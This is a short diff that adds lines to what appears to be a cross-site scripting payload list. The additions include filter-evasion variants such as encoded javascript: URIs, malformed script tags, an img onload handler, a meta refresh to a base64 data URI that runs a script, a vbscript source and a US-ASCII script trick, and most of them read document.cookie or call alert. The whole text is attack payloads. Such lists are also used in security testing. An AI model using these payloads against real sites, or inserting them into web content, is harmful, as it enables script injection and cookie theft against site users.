@@ -5,4 +5,13 @@
 {{$on.constructor('alert(1)')()}}
 <kebby onfocus=”alert(document.cookie)” id=”x” tabindex=”1”>
 <input autofocus onfocus=alert(1)>
-
+javascript&#x3aalert(document&#x2Ecookie)
+&#0000097&#0000108&#0000101&#0000114&#0000116
+<script[\x09]>
+<script src=test`onload=`alert(document.cookie)></script>
+<<script>alert(document.cookie)//<</script>
+<img/onload=alert(document.cookie)>
+<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ">
+<img src='vbscript:msgbox("warning")'>
+¼script¾alert(¢XSS¢)¼/script¾
+&#96;`${alert``}`&#96;
